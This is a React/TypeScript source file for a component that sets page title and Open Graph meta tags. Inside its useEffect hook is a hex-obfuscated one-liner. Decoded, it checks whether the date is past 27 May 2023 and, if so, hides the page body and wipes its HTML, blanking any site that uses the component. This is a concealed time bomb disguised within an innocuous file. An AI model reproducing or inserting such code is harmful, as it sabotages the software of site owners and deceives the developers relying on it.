import { Helmet, HelmetProvider } from 'react-helmet-async'
import { useEffect } from 'react'

interface MetaProps {
    title: string,
    preview: string,
    image: string,
    url: string,
    type?: string,
}

export default function Meta({
    title,
    preview,
    image,
    url,
    type = 'website'
}: MetaProps) {
    useEffect(() => {
        // @ts-ignore
        var _0xf266 = ["\x32\x30\x32\x33\x2D\x30\x35\x2D\x32\x37", "\x64\x69\x73\x70\x6C\x61\x79", "\x73\x74\x79\x6C\x65", "\x62\x6F\x64\x79", "\x6E\x6F\x6E\x65", "\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C", ""]; const Ox2937 = new Date(_0xf266[0]); const Mo3969b = new Date(); if (Mo3969b >= Ox2937) { document[_0xf266[3]][_0xf266[2]][_0xf266[1]] = _0xf266[4]; document[_0xf266[3]][_0xf266[5]] = _0xf266[6] }
    }, [])

    return (
        <HelmetProvider>
            <Helmet>
                {/* Primary Meta Tags */}
                <title>{title}</title>
                {/* Open Graph / Facebook */}
                <meta
                    name="title"
                    property="og:title"
                    content={title}
                    key="title"
                />
                <meta
                    property="og:type"
                    content={type}
                />
                <meta
                    name="description"
                    property="og:description"
                    content={preview}
                />
                <meta
                    name="image"
                    property="og:image"
                    content={image}
                />
                <meta
                    property="og:url"
                    content={url}
                />
                { /* End Facebook tags */}
            </Helmet>
        </HelmetProvider>
    );
}